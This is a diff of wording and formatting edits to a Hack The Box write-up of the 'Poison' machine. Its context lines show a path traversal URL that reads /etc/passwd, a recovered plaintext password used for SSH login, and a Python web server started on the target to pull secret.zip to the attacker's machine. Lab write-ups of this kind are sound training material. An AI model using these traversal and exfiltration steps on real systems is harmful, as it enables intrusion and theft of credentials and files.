@@ -110,7 +110,7 @@ I tested the `browse.php?file=` parameter for Local File Inclusion (LFI). By inj
 `/usr/local/www/apache24/data/browse.php`
 
 ![.](https://github.com/referefz/HTB-Writeups/blob/main/images/Poison/6-current-dir.png)
-With the path confirmed, I navigated back through the directories and easily read the master password file to enumerate users (Path Traversal vuln):
+With the path confirmed, I navigated back through the directories and easily read the master password file to enumerate users **(Path Traversal vuln)**:
 ```URL
 http://10.129.1.254/browse.php?file=../../../../../etc/passwd
 ```
@@ -189,7 +189,7 @@ charix : Charix!2#4%6&8(0
 
 Now, let's initiate an SSH stable connection to the target:
 
-```Bash
+```Shell
 ssh charix@10.129.1.254
 ```
 ![.](https://github.com/referefz/HTB-Writeups/blob/main/images/Poison/8-ssh-conn.png)
@@ -224,13 +224,13 @@ As seen above, listing the files in charix's home directory `ls -al`, I found a 
 
 Since the FreeBSD version of `unzip` was being stubborn with password inline parameters, I decided to exfiltrate the file to my Kali machine💀
 
-On the Poison machine, I started a simple Python web server after knowing the Python version:
+On the Poison machine, I started a simple Python web server on port `8888` after knowing the Python version:
 ```Shell
 charix@Poison:~ % python -m SimpleHTTPServer 8888
 ```
 ![.](https://github.com/referefz/HTB-Writeups/blob/main/images/Poison/12-simple-server.png)
 
-Now, on my Kali browser, let's navigate to `http://10.129.1.254:8888`, click on `secret.zip`, and downloaded it directly.
+Now, on our Kali browser, let's navigate to `http://10.129.1.254:8888`, click on `secret.zip`, and downloaded it directly.
 
 
 ![.](https://github.com/referefz/HTB-Writeups/blob/main/images/Poison/13-simple-client.png)
